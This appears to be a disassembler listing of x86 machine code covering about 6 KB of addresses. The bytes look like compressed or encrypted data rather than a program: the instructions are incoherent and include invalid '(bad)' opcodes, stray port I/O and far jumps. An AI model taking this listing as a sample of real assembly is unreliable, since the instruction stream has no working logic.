  414fe8:	jmp    0xe4c04a4e
  414fed:	in     al,0xf6
  414fef:	in     al,0x24
  414ff1:	xchg   ecx,eax
  414ff2:	push   esp
  414ff3:	scas   al,BYTE PTR es:[edi]
  414ff4:	loopne 0x414fc6
  414ff6:	cmp    al,0xfa
  414ff8:	aam    0xc1
  414ffa:	int    0xa3
  414ffc:	cmp    al,0xf4
  414ffe:	aas    
  414fff:	mov    ds:0x833a020a,al
  415004:	push   cs
  415005:	pop    ecx
  415006:	jg     0x414ffc
  415008:	repz ret 0xbdbb
  41500c:	cmp    esi,ebp
  41500e:	neg    BYTE PTR [edx]
  415010:	cmp    DWORD PTR [edi-0x6cca1e5],ecx
  415016:	sbb    BYTE PTR [esi+edi*1-0x47],0xf4
  41501b:	out    dx,eax
  41501c:	mov    ebp,0x43eba957
  415021:	pop    edi
  415022:	cmp    ch,BYTE PTR [eax+0x3f30dddf]
  415028:	(bad)  [esi+0x198faf7f]
  41502e:	leave  
  41502f:	adc    eax,0xedbf76cd
  415034:	gs je  0x414ff3
  415037:	(bad)  [ecx+0x16]
  41503a:	push   ss
  41503b:	or     BYTE PTR [edx+0x3d1151a3],ah
  415041:	dec    edi
  415042:	pop    ds
  415043:	stc    
  415044:	lock adc bl,BYTE PTR [eax]
  415047:	inc    eax
  415048:	out    dx,al
  415049:	popa   
  41504a:	inc    esp
  41504b:	retf   
  41504c:	adc    ebx,DWORD PTR [ebx-0x13]
  41504f:	imul   BYTE PTR [ecx-0x76]
  415052:	leave  
  415053:	les    esp,FWORD PTR [edx+0x52614b35]
  415059:	push   ds
  41505a:	xchg   edi,eax
  41505b:	and    eax,0x6511c4d6
  415060:	shr    DWORD PTR [edx+0x7404daa9],cl
  415066:	icebp  
  415067:	adc    DWORD PTR [esi-0x7340bda3],ebp
  41506d:	and    esi,DWORD PTR [edi]
  41506f:	or     al,0x2
  415071:	mov    ah,0x8a
  415073:	dec    edi
  415074:	fcmovnbe st,st(5)
  415076:	push   ecx
  415077:	frstor [edi+0x5dd85564]
  41507d:	cdq    
  41507e:	ret    
  41507f:	xchg   BYTE PTR [esi-0x4c4fcb78],ah
  415085:	push   0xfffffff8
  415087:	mov    eax,DWORD PTR [esi-0x62daa2d4]
  41508d:	sub    BYTE PTR [ebx],dh
  41508f:	push   ebx
  415090:	rol    DWORD PTR [eax],0x0
	...
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xc4ccfc2d
  415102:	imul   DWORD PTR [esi+0xde18]
  415108:	add    eax,0x7000001
  41510d:	push   ss
  41510e:	outs   dx,BYTE PTR ds:[esi]
  41510f:	mov    al,0x4b
  415111:	push   ss
  415112:	dec    edi
  415113:	mov    ds:0xc7d2db2,eax
  415118:	sub    DWORD PTR [edi],ebp
  41511a:	ror    BYTE PTR [edx-0x4d],1
  41511d:	not    BYTE PTR [ecx-0x2731f60]
  415123:	cmp    eax,0x7f231c6f
  415128:	xor    edx,DWORD PTR [edx-0x14781608]
  41512e:	retf   0x5642
  415131:	pop    ebx
  415132:	aam    0x1a
  415134:	rol    BYTE PTR [eax],0xe3
  415137:	aam    0xf6
  415139:	(bad)  
  41513a:	test   al,0x79
  41513c:	cmp    al,BYTE PTR [ebx-0x33cfc25d]
  415142:	shl    BYTE PTR [ecx],0x66
  415145:	mov    ds:0xeab309ec,al
  41514a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41514b:	or     DWORD PTR [edx],0x41185ca4
  415151:	mov    esi,0x1673b396
  415156:	js     0x4151b9
  415158:	scas   eax,DWORD PTR es:[edi]
  415159:	imul   edx,DWORD PTR [ebx-0x236cc196],0xf07b8169
  415163:	arpl   WORD PTR [ebp+ebx*2-0x5947ee2d],si
  41516a:	fsubrp st(5),st
  41516c:	push   edi
  41516d:	jb     0x415190
  41516f:	push   ss
  415170:	arpl   di,bp
  415172:	mov    edi,0xadcd9762
  415177:	jb     0x41517c
  415179:	mov    ebx,0x3e2a621a
  41517e:	push   0xffffff91
  415180:	fild   QWORD PTR [ebx+edx*2-0x3f]
  415184:	scas   eax,DWORD PTR es:[edi]
  415185:	rcl    esi,0x92
  415188:	fst    QWORD PTR [ebp+0xe9602a0]
  41518e:	out    0x71,eax
  415190:	jbe    0x415161
  415192:	mov    al,cs:0x96c1f6ed
  415198:	mov    dh,0x2a
  41519a:	mov    dl,0x9e
  41519c:	xchg   esp,eax
  41519d:	gs popa 
  41519f:	mov    DWORD PTR [ecx-0x41],ebp
  4151a2:	mov    ah,0x5d
  4151a4:	not    BYTE PTR [esi+0x6d4a7861]
  4151aa:	retf   0x2ae9
  4151ad:	mov    ds:0x8d6f3609,eax
  4151b2:	out    0xf1,al
  4151b4:	pop    eax
  4151b5:	sbb    esi,DWORD PTR [eax+0x7a]
  4151b8:	loop   0x41516d
  4151ba:	js     0x415195
  4151bc:	cs adc eax,0xf116e074
  4151c2:	call   0x8fcf:0xb14b88c
  4151c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ca:	jb     0x4151aa
  4151cc:	popf   
  4151cd:	cmp    eax,0x1f79a775
  4151d2:	push   es
  4151d3:	(bad)  
  4151d4:	(bad)  
  4151d5:	cmp    DWORD PTR [eax-0x272f7706],ecx
  4151db:	ins    BYTE PTR es:[edi],dx
  4151dc:	push   ds
  4151dd:	sbb    DWORD PTR [ecx+0x68],ebp
  4151e0:	lods   al,BYTE PTR ds:[esi]
  4151e1:	pop    ecx
  4151e2:	sbb    BYTE PTR [edi],ah
  4151e4:	dec    edi
  4151e5:	or     eax,DWORD PTR [esi+0x3049114c]
  4151eb:	nop
  4151ec:	out    0x57,eax
  4151ee:	mov    bh,0x59
  4151f0:	jmp    0x6a0fb0dd
  4151f5:	xor    eax,0x31c19eb9
  4151fa:	repnz pushf 
  4151fc:	fnsetpm(287 only) 
  4151fe:	pop    esp
  4151ff:	xchg   ebp,eax
  415200:	lods   eax,DWORD PTR ds:[esi]
  415201:	das    
  415202:	mov    al,ds:0x33716b11
  415207:	jmp    0x4151d5
  415209:	jmp    0x415242
  41520b:	loop   0x415269
  41520d:	xor    al,0x47
  41520f:	std    
  415210:	in     eax,dx
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x1c87f00b
  415283:	(bad)  
  415284:	sbb    eax,0x50000df
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    BYTE PTR [eax-0x6a],bh
  41528e:	lds    edi,FWORD PTR [eax+0x1ddf884f]
  415294:	rol    ah,cl
  415296:	adc    cl,BYTE PTR [ecx-0x60]
  415299:	idiv   dl
  41529b:	ror    ecx,1
  41529d:	add    bl,al
  41529f:	sahf   
  4152a0:	mov    ebx,DWORD PTR [ecx]
  4152a2:	push   esp
  4152a3:	hlt    
  4152a4:	sbb    eax,0x345bb3c7
  4152a9:	fcmovb st,st(5)
  4152ab:	fnsave [edi+0x29928139]
  4152b1:	add    BYTE PTR [ebx],dh
  4152b3:	push   eax
  4152b4:	sbb    eax,DWORD PTR [ebp-0x3d]
  4152b7:	(bad)  
  4152b8:	div    BYTE PTR [ebx-0x6a]
  4152bb:	(bad)
  4152c0:	pop    ebx
  4152c1:	pop    ss
  4152c2:	cmp    DWORD PTR [edi+0xaf105ad],ebp
  4152c8:	mov    al,ds:0xdb4767fb
  4152cd:	inc    edx
  4152ce:	sub    DWORD PTR [ebx+0x66],esp
  4152d1:	es inc edx
  4152d3:	fcomip st,st(2)
  4152d5:	ss adc al,0x8e
  4152d8:	sub    DWORD PTR es:[ecx],eax
  4152db:	jge    0x415304
  4152dd:	(bad)  
  4152de:	and    dh,BYTE PTR ds:[ecx+esi*8+0xb7f7d4c]
  4152e6:	ja     0x41531b
  4152e8:	fisubr WORD PTR [edi+0x37dee5d4]
  4152ee:	jno    0x4152ec
  4152f0:	int    0xd1
  4152f2:	dec    ebp
  4152f3:	xlat   BYTE PTR ds:[ebx]
  4152f4:	push   eax
  4152f5:	in     al,dx
  4152f6:	das    
  4152f7:	jae    0x41527b
  4152f9:	fisttp DWORD PTR [esi]
  4152fb:	jge    0x415294
  4152fd:	and    BYTE PTR [ebp-0x3f],0x66
  415301:	xor    al,BYTE PTR [esi+ebx*4+0x6c]
  415305:	arpl   WORD PTR [eax+0x3389b4b0],dx
  41530b:	sub    al,0xf7
  41530d:	cwde   
  41530e:	pop    ebp
  41530f:	jne    0x41530a
  415311:	mov    eax,ds:0x36b66fa0
  415316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415317:	fisub  DWORD PTR [ecx+0xad363e6]
  41531d:	loop   0x41536e
  41531f:	xor    DWORD PTR [ebx],ebx
  415321:	push   ds
  415322:	out    dx,eax
  415323:	fldenv [esi]
  415325:	mov    dh,0xe7
  415327:	test   DWORD PTR [esi],esi
  415329:	jp     0x4152af
  41532b:	in     eax,dx
  41532c:	cs inc edi
  41532e:	fbstp  TBYTE PTR [eax]
  415330:	les    esi,FWORD PTR [ebx]
  415332:	mov    ah,0x24
  415334:	sbb    al,0xbd
  415336:	mov    dl,0x66
  415338:	adc    BYTE PTR [esi-0x64aaa067],ch
  41533e:	sub    BYTE PTR [ebx],al
  415340:	jge    0x4153bd
  415342:	push   edx
  415343:	xor    ebx,DWORD PTR ds:0x452a8adf
  415349:	jmp    0xcb4f2baa
  41534e:	xchg   esp,eax
  41534f:	shl    DWORD PTR [edx],cl
  415351:	cmp    cl,cl
  415353:	sub    al,0x37
  415355:	rol    BYTE PTR [eax+0x74],cl
  415358:	or     dl,bh
  41535a:	fimul  DWORD PTR [esi+0x5f3d1dd1]
  415360:	jmp    0xba09:0x186fbe69
  415367:	sar    BYTE PTR [esi+0x22],cl
  41536a:	fwait
  41536b:	cmp    BYTE PTR [ecx+0x2],0x85
  41536f:	adc    esp,DWORD PTR [ecx+0x7f]
  415372:	jmp    0x415311
  415374:	ds in  al,0x2
  415377:	in     eax,dx
  415378:	push   es
  415379:	mov    esi,0x9abbcd1a
  41537e:	fild   DWORD PTR [eax-0x46]
  415381:	test   al,0x2e
  415383:	in     al,0x92
  415385:	jae    0x4153f2
  415387:	xor    al,0x0
  415389:	or     dl,BYTE PTR [ebx]
  41538b:	rcl    DWORD PTR [edi],0xe3
  41538e:	jecxz  0x4153fc
  415390:	pop    esp
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x41d3e5b0
  415401:	loopne 0x415401
  415403:	mov    ds:0xe022,eax
  415408:	add    eax,0x53000001
  41540d:	adc    edi,edx
  41540f:	lea    ebx,[esi+esi*2+0x409fa06]
  415416:	xchg   DWORD PTR [ebp+0x9],edi
  415419:	xor    DWORD PTR [ebp-0x61],ecx
  41541c:	jb     0x4153eb
  41541e:	mov    edi,0x4d3468fa
  415423:	inc    eax
  415424:	inc    edi
  415425:	(bad)  
  415426:	imul   ebx,DWORD PTR [ecx],0xfffffff7
  415429:	mov    edi,0x69d3d607
  41542e:	lods   al,BYTE PTR ds:[esi]
  41542f:	dec    edx
  415430:	leave  
  415431:	fs or  al,0x93
  415434:	add    eax,0x58e4aa42
  415439:	mov    eax,0x4f58062f
  41543e:	or     bh,0x42
  415441:	nop
  415442:	aam    0x80
  415444:	and    eax,0x286750b8
  415449:	and    BYTE PTR [ecx+0x8],bh
  41544c:	lods   al,BYTE PTR ds:[esi]
  41544d:	sbb    eax,DWORD PTR [eax]
  41544f:	lods   al,BYTE PTR ss:[esi]
  415451:	xor    dh,BYTE PTR [ebx]
  415453:	mov    al,0xfd
  415455:	xor    al,0x62
  415457:	stos   BYTE PTR es:[di],al
  415459:	scas   al,BYTE PTR es:[edi]
  41545a:	ret    0x64f5
  41545d:	or     al,0x3
  41545f:	xchg   edx,eax
  415460:	mov    edi,ss
  415462:	mov    BYTE PTR [ebx],al
  415464:	push   edx
  415465:	pop    edi
  415466:	mov    ch,BYTE PTR [esp+edi*8+0x6f]
  41546a:	and    BYTE PTR [edx-0x3f],ch
  41546d:	retf   
  41546e:	stc    
  41546f:	mov    dh,0xd6
  415471:	push   ebp
  415472:	push   ss
  415473:	pop    ebx
  415474:	pop    ds
  415475:	mov    dl,0xc8
  415477:	adc    BYTE PTR [edi+ebp*4-0x24],bl
  41547b:	mov    BYTE PTR [edi-0x2f],dl
  41547e:	mov    edi,0xa07cb3a0
  415483:	pushf  
  415484:	or     al,0x98
  415486:	mov    al,0xbf
  415488:	and    edx,edi
  41548a:	icebp  
  41548b:	cld    
  41548c:	lods   al,BYTE PTR ds:[si]
  41548e:	fs jp  0x415472
  415491:	dec    edi
  415492:	adc    edi,ecx
  415494:	leave  
  415495:	pop    ecx
  415496:	mov    dh,0xee
  415498:	mov    ch,0xc2
  41549a:	sub    BYTE PTR [ebp-0x32c311a9],dl
  4154a0:	xlat   BYTE PTR ds:[ebx]
  4154a1:	mov    ebx,0xccd48e84
  4154a6:	ins    DWORD PTR es:[edi],dx
  4154a7:	xor    ah,BYTE PTR [esi]
  4154a9:	mul    BYTE PTR cs:[ebp-0x16]
  4154ad:	dec    ebp
  4154ae:	les    ebp,FWORD PTR [ecx]
  4154b0:	loopne 0x415481
  4154b2:	std    
  4154b3:	fisubr WORD PTR [ebp+0x229e29e6]
  4154b9:	sbb    al,0x6e
  4154bb:	mov    edx,?
  4154bd:	out    dx,eax
  4154be:	push   ss
  4154bf:	dec    ebx
  4154c0:	leave  
  4154c1:	imul   ebx,DWORD PTR [edx+0xed5742e],0x62
  4154c8:	je     0x4154cb
  4154ca:	rol    DWORD PTR [edi-0x4f06c3fa],cl
  4154d0:	sar    DWORD PTR [ebx-0x4],cl
  4154d3:	outs   dx,DWORD PTR ds:[esi]
  4154d4:	leave  
  4154d5:	adc    DWORD PTR [ecx],esp
  4154d7:	mov    esi,0xb9dd93da
  4154dc:	cmp    eax,DWORD PTR [ebx]
  4154de:	mov    BYTE PTR [ecx+0x1c],bl
  4154e1:	stc    
  4154e2:	std    
  4154e3:	stos   DWORD PTR es:[edi],eax
  4154e4:	stos   BYTE PTR es:[edi],al
  4154e5:	mov    bh,0xb8
  4154e7:	cs dec esp
  4154e9:	dec    esp
  4154ea:	jb     0x4154ec
  4154ec:	add    eax,0xf9b5a10a
  4154f1:	(bad)  
  4154f2:	enter  0x333a,0x76
  4154f6:	mov    DWORD PTR [ecx-0x3082bf2c],esp
  4154fc:	(bad)  
  4154fe:	adc    eax,0xfae7c7a3
  415503:	fcom   QWORD PTR [ecx+0x2b]
  415506:	fwait
  415507:	pop    ss
  415508:	into   
  415509:	sbb    eax,0x60daf05d
  41550e:	repz add DWORD PTR [edx+0x0],esp
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155a5
  415581:	inc    bh
  415583:	or     al,0x27
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0xd7000001,al
  41558d:	ins    DWORD PTR es:[edi],dx
  41558e:	repz jae 0x4155bf
  415591:	pop    es
  415592:	xchg   ebp,eax
  415593:	adc    eax,0xee649a16
  415598:	jae    0x415619
  41559a:	mov    edx,0xb6bd304
  41559f:	sbb    edi,DWORD PTR [eax]
  4155a1:	and    BYTE PTR [edi-0x65],cl
  4155a4:	es stc 
  4155a6:	js     0x4155d4
  4155a8:	xabort 0xe4
  4155ab:	stc    
  4155ac:	mov    ecx,0x9a97ff03
  4155b1:	(bad)  
  4155b3:	sar    DWORD PTR [eax+eiz*1+0x37],0x78
  4155b8:	cld    
  4155b9:	push   esp
  4155ba:	cmp    DWORD PTR [edi-0x31],ebp
  4155bd:	mov    ch,0xc0
  4155bf:	in     al,0x7d
  4155c1:	or     dh,BYTE PTR [ebx+edx*4+0x16a0ce9]
  4155c8:	repz and eax,0x8ab784bf
  4155ce:	adc    eax,0xf0bb18fb
  4155d3:	mov    eax,0xfaaf5527
  4155d8:	shr    BYTE PTR fs:[ebx+0x72],1
  4155dc:	xor    DWORD PTR [esi+0x94f955a],0xf
  4155e3:	iret   
  4155e4:	out    dx,eax
  4155e5:	leave  
  4155e6:	pop    eax
  4155e7:	mov    es:0xa063095c,al
  4155ed:	mov    ah,0x9
  4155ef:	pop    ebp
  4155f0:	fmul   DWORD PTR [eax]
  4155f2:	mov    eax,0x6a43c58c
  4155f7:	mov    edx,ebp
  4155f9:	clc    
  4155fa:	adc    bl,BYTE PTR [eax+eax*2]
  4155fd:	push   es
  4155fe:	das    
  4155ff:	inc    esp
  415600:	xchg   esi,eax
  415601:	jle    0x415595
  415603:	fst    DWORD PTR [esi+0x7ec4fea0]
  415609:	inc    edx
  41560a:	mov    ch,0x55
  41560c:	dec    eax
  41560d:	and    eax,0x628f7dbb
  415612:	dec    ebx
  415613:	push   ecx
  415614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415615:	xchg   esi,eax
  415616:	loopne 0x415650
  415618:	(bad)  
  415619:	jmp    0x956d:0x6d6343af
  415620:	xor    dh,ah
  415622:	enter  0x6274,0xf7
  415626:	jns    0x415613
  415628:	gs loopne 0x415685
  41562b:	jb     0x415665
  41562d:	cbw    
  41562f:	stos   DWORD PTR es:[edi],eax
  415630:	stos   BYTE PTR es:[edi],al
  415631:	sub    eax,0x1ba35fe5
  415636:	mov    BYTE PTR [ecx],bl
  415638:	data16 in al,dx
  41563a:	stc    
  41563b:	out    dx,eax
  41563c:	jns    0x41561f
  41563e:	push   0xffffffc2
  415640:	xchg   esi,eax
  415641:	out    0x47,eax
  415643:	mov    ah,0xa2
  415645:	mov    ecx,0xc7be12c8
  41564a:	or     eax,0x6bfcde5f
  41564f:	add    DWORD PTR [edi],esp
  415651:	mov    al,ds:0x37891431
  415656:	mov    eax,ds:0x94aef180
  41565b:	dec    ecx
  41565c:	mov    ebp,0xeab4f6ae
  415661:	sub    bh,BYTE PTR [ebp+0x6c478603]
  415667:	shr    dl,cl
  415669:	mov    ds:0x4dea9880,al
  41566e:	daa    
  41566f:	neg    bh
  415671:	outs   dx,DWORD PTR ds:[esi]
  415672:	bound  edi,QWORD PTR [esi+0x47385772]
  415678:	jb     0x4156e3
  41567a:	enter  0xfa5b,0x3a
  41567e:	jo     0x41569e
  415680:	retf   0xbf65
  415683:	add    ch,BYTE PTR [ecx+0x1b]
  415686:	push   es
  415687:	push   ss
  415688:	ins    DWORD PTR es:[edi],dx
  415689:	out    dx,eax
  41568a:	cmp    cl,BYTE PTR ds:0x8b1de2ac
  415690:	imul   eax,DWORD PTR [eax],0x0
	...
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	call   0x2cf9dd86
  415705:	loop   0x415707
  415707:	add    BYTE PTR ds:0x4b000001,al
  41570d:	imul   edx,DWORD PTR [esi-0x22accdc0],0xffffff9b
  415714:	ret    0xe3a6
  415717:	xor    BYTE PTR [ecx+edx*8-0xfba0a7e],cl
  41571e:	pop    esp
  41571f:	in     eax,dx
  415720:	mov    eax,ds:0xdcf17114
  415725:	jle    0x4156cc
  415727:	ss xchg esi,eax
  415729:	inc    eax
  41572a:	mov    al,0xd0
  41572c:	mov    cl,0xc
  41572e:	mov    DWORD PTR [eax],esp
  415730:	imul   BYTE PTR ds:0xa0332b65
  415736:	pusha  
  415737:	mov    ebx,0x2c3def6b
  41573c:	fcomp  DWORD PTR [ebp-0x7ec7be78]
  415742:	out    0x86,eax
  415744:	cmp    edx,edx
  415746:	out    0x9e,eax
  415748:	ret    
  415749:	jae    0x41577c
  41574b:	inc    eax
  41574c:	inc    ecx
  41574d:	in     al,dx
  41574e:	adc    bl,BYTE PTR [eax]
  415750:	mov    ch,dl
  415752:	sub    ecx,0x7fd509e8
  415758:	jno    0x4157d5
  41575a:	adc    esp,ebx
  41575c:	mov    edx,0xcf0f3556
  415761:	jb     0x4157ce
  415763:	inc    ebx
  415764:	xor    DWORD PTR [esi+ebp*8-0x49],ecx
  415768:	jo     0x4156ee
  41576a:	stc    
  41576b:	data16 rcl BYTE PTR [edx-0x2c],0x5
  415770:	push   edx
  415772:	fistp  QWORD PTR [ebp-0xc87c7ad]
  415778:	sub    eax,0x8b83ce94
  41577d:	cmp    edi,edx
  41577f:	mov    cs,WORD PTR [ecx]
  415781:	add    eax,DWORD PTR [esi-0x1a]
  415784:	adc    eax,0x7b490982
  415789:	dec    edi
  41578a:	inc    esp
  41578b:	adc    al,0x8f
  41578d:	bound  ebp,QWORD PTR [ebx+0x21]
  415790:	jecxz  0x4157fe
  415792:	sbb    BYTE PTR [ebx-0x26],cl
  415795:	cmp    al,0x17
  415797:	retf   0x116f
  41579a:	cwde   
  41579b:	rcl    DWORD PTR ds:0x960bf157,1
  4157a1:	stos   DWORD PTR es:[edi],eax
  4157a2:	sbb    ecx,DWORD PTR [edi-0x43]
  4157a5:	enter  0xa227,0x63
  4157a9:	clc    
  4157aa:	test   bl,ah
  4157ac:	(bad)  
  4157ad:	and    DWORD PTR [ebx],eax
  4157af:	mov    WORD PTR [ebx+0x37c621f1],?
  4157b5:	sbb    eax,0x286d8e6b
  4157ba:	pop    es
  4157bb:	jl     0x4157d9
  4157bd:	clc    
  4157be:	(bad)  
  4157bf:	shl    DWORD PTR [ecx],cl
  4157c1:	or     DWORD PTR [ecx-0x5d65604c],0xffffffab
  4157c8:	retf   
  4157c9:	int    0xe9
  4157cb:	sub    al,0x52
  4157cd:	je     0x41579c
  4157cf:	or     eax,0x4927bf71
  4157d4:	daa    
  4157d5:	pop    ebp
  4157d6:	and    cl,bh
  4157d8:	mov    gs,ecx
  4157da:	and    ebx,DWORD PTR [esp+ecx*2+0x41]
  4157de:	mov    es,WORD PTR [ebx+0x6b3ba927]
  4157e4:	pmaxsw mm1,QWORD PTR [edi-0x48]
  4157e8:	ficom  DWORD PTR [edi]
  4157ea:	and    edi,DWORD PTR [ebp-0x6e]
  4157ed:	cdq    
  4157ee:	rol    ecx,1
  4157f0:	ins    DWORD PTR es:[edi],dx
  4157f1:	fnop   
  4157f3:	test   BYTE PTR [ebp+0x10],bl
  4157f6:	aad    0xb1
  4157f8:	jg     0x4157da
  4157fa:	pop    edi
  4157fb:	iret   
  4157fc:	xchg   edi,eax
  4157fd:	jmp    0xc2fc3d95
  415802:	sub    DWORD PTR [ebp+0x7d],edi
  415805:	lds    esi,FWORD PTR [edx]
  415807:	adc    eax,0x5e6166a8
  41580c:	cli    
  41580d:	idiv   ecx
  41580f:	push   edi
  415810:	sti    
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	sar    DWORD PTR [esi+0x5e],cl
  415882:	pop    ss
  415883:	cld    
  415884:	xor    ebx,esp
  415886:	add    BYTE PTR [eax],al
  415888:	add    eax,0xf3000001
  41588d:	xchg   edi,eax
  41588e:	ss xor al,0xe8
  415891:	fst    st(0)
  415893:	dec    esp
  415894:	ins    BYTE PTR es:[edi],dx
  415895:	int3   
  415896:	sbb    al,ah
  415898:	push   ebx
  415899:	mov    edi,0x871c4fe4
  41589e:	jp     0x415902
  4158a0:	dec    ecx
  4158a1:	sbb    DWORD PTR [ebx-0xa],0x20
  4158a5:	retw   0xf24e
  4158a9:	sub    BYTE PTR ds:0x78466794,0x46
  4158b0:	int3   
  4158b1:	push   0xffffffea
  4158b3:	aaa    
  4158b4:	rcl    BYTE PTR fs:0x497d814b,0x80
  4158bc:	outs   dx,BYTE PTR ds:[esi]
  4158bd:	jbe    0x415904
  4158bf:	hlt    
  4158c0:	mov    eax,0x61781840
  4158c5:	mov    esp,0x4628842b
  4158ca:	es pop eax
  4158cc:	cmp    ecx,DWORD PTR [ecx+ebp*8+0x45]
  4158d0:	and    al,0xeb
  4158d2:	or     bh,BYTE PTR [ecx-0x329c59e8]
  4158d8:	dec    ecx
  4158d9:	lock xor eax,0x4059a13c
  4158df:	les    ebp,FWORD PTR fs:[esi-0x59]
  4158e3:	(bad)  
  4158e4:	mov    ds:0x7ffceae0,eax
  4158e9:	stos   BYTE PTR es:[edi],al
  4158ea:	adc    al,BYTE PTR [edx]
  4158ec:	xlat   BYTE PTR ds:[ebx]
  4158ed:	pushf  
  4158ee:	and    BYTE PTR [ebp+0x6e1a5a81],cl
  4158f4:	dec    ecx
  4158f5:	rcr    bl,cl
  4158f7:	hlt    
  4158f8:	repnz inc ecx
  4158fa:	push   0x58875eb8
  4158ff:	icebp  
  415900:	ds adc ebp,ecx
  415903:	adc    DWORD PTR [ebp+0x9229114],ebp
  415909:	mov    DWORD PTR [edx-0x34],esi
  41590c:	mov    esi,ecx
  41590e:	lea    edi,[edi+eax*2]
  415911:	dec    esp
  415912:	mov    ebp,0x409c216b
  415917:	add    ecx,DWORD PTR [esi+0x36d3b58c]
  41591d:	sbb    al,0x6d
  41591f:	inc    ecx
  415920:	out    0x26,al
  415922:	dec    eax
  415923:	xchg   ebp,eax
  415924:	scas   al,BYTE PTR es:[edi]
  415925:	pop    ds
  415926:	sub    eax,0x71457cb
  41592b:	cmp    DWORD PTR [eax+0x52],esi
  41592e:	in     eax,dx
  41592f:	mov    cs:0x8f88a291,al
  415935:	add    DWORD PTR [eax],eax
  415937:	jns    0x41592e
  415939:	push   edx
  41593a:	in     eax,0x2e
  41593c:	mov    al,ds:0x4a831d96
  415941:	add    BYTE PTR [ebx+0x5608501d],dh
  415947:	or     BYTE PTR [ebx+0x59a093c3],dh
  41594d:	adc    BYTE PTR [edx+0x3d],cl
  415950:	mov    esi,0x7233e0b0
  415955:	pop    edx
  415956:	mov    WORD PTR [esi+0x7c986062],fs
  41595c:	xor    eax,0xa6a31c27
  415961:	(bad)  
  415962:	cld    
  415963:	sub    BYTE PTR [ebx-0xebe8fef],0x19
  41596a:	ins    DWORD PTR es:[edi],dx
  41596b:	sub    eax,0x2a0e2741
  415970:	stos   BYTE PTR es:[edi],al
  415971:	sbb    BYTE PTR [edi+0x42],bh
  415974:	sub    ch,BYTE PTR [esi-0x2d5a7b0]
  41597a:	scas   al,BYTE PTR es:[edi]
  41597b:	pop    ds
  41597c:	test   BYTE PTR [edx],dl
  41597e:	in     eax,0xa3
  415980:	data16 (bad) 
  415982:	jge    0x41594e
  415984:	ret    0x281e
  415987:	cmc    
  415988:	test   ebx,eax
  41598a:	mov    bh,0x55
  41598c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41598d:	loope  0x41593f
  41598f:	xchg   ecx,eax
  415990:	add    BYTE PTR cs:[eax],al
	...
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	(bad)  
  415a01:	dec    ecx
  415a02:	push   ebp
  415a03:	xchg   edi,eax
  415a04:	ss in  al,0x0
  415a07:	add    BYTE PTR ds:0xf3000001,al
  415a0d:	xchg   esi,eax
  415a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a0f:	icebp  
  415a10:	sub    eax,0xe0f0f1ea
  415a15:	(bad)
  415a19:	add    ecx,DWORD PTR ds:0x8e435f72
  415a1f:	call   DWORD PTR [edi-0x241b1e47]
  415a25:	mov    ecx,0xcb8824d
  415a2a:	adc    eax,DWORD PTR [eax]
  415a2c:	mov    BYTE PTR [ecx+0x43e8b9fd],ch
  415a32:	jne    0x415a01
  415a34:	ins    BYTE PTR es:[edi],dx
  415a35:	fisubr DWORD PTR [ebp-0x30517f]
  415a3b:	clc    
  415a3c:	mov    bh,0x8d
  415a3e:	pop    es
  415a3f:	(bad)  
  415a41:	add    bl,bl
  415a43:	sub    ch,bh
  415a45:	mov    DWORD PTR [ebp-0x4017b5c6],ebx
  415a4b:	xchg   ecx,eax
  415a4c:	fcom   DWORD PTR [edx]
  415a4e:	adc    BYTE PTR [edi+0x20a13678],dl
  415a54:	mov    esp,0x18f4e3c
  415a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a5a:	jmp    0x239:0xa4dad8d4
  415a61:	mov    ebx,0x23b0687e
  415a66:	push   ebp
  415a67:	out    dx,eax
  415a68:	dec    esp
  415a69:	stc    
  415a6a:	nop
  415a6b:	pop    ds
  415a6c:	mov    eax,0xe9fbc824
  415a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a72:	inc    eax
  415a73:	mov    eax,ds:0x2ef14e72
  415a78:	sbb    al,0x55
  415a7a:	dec    ebp
  415a7b:	clc    
  415a7c:	imul   eax,DWORD PTR [edi-0x2e],0x2c
  415a80:	adc    DWORD PTR [ecx+0x7e720051],0xa3484fc0
  415a8a:	test   al,0xda
  415a8c:	lods   al,BYTE PTR ds:[esi]
  415a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a8e:	or     edx,eax
  415a90:	out    dx,eax
  415a91:	adc    edi,DWORD PTR [edi+0x42]
  415a94:	rol    eax,cl
  415a96:	std    
  415a97:	push   esi
  415a98:	jecxz  0x415a5f
  415a9a:	pop    ss
